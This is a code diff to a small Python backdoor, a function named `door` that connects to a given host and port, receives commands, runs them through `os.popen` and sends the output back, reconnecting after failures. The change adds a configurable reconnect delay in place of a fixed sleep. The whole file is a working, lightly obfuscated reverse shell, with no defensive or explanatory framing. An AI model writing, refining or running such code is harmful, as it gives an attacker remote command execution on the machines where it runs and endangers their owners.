@@ -3,7 +3,7 @@ import os
 import time
 from socket import*
 
-def door(h, p):
+def door(h, p, w=16):
     while 6:
         try:
             def CE(F):
@@ -18,7 +18,7 @@ def door(h, p):
             D = lambda I: T(I.decode)
             while 6: S(CE(lambda: E(os.popen(D(R(1024))).read())) or b"\xff")
         except Exception:
-            time.sleep(6*6)
+            time.sleep(w)
 
 if __name__ == "__main__":
     import sys
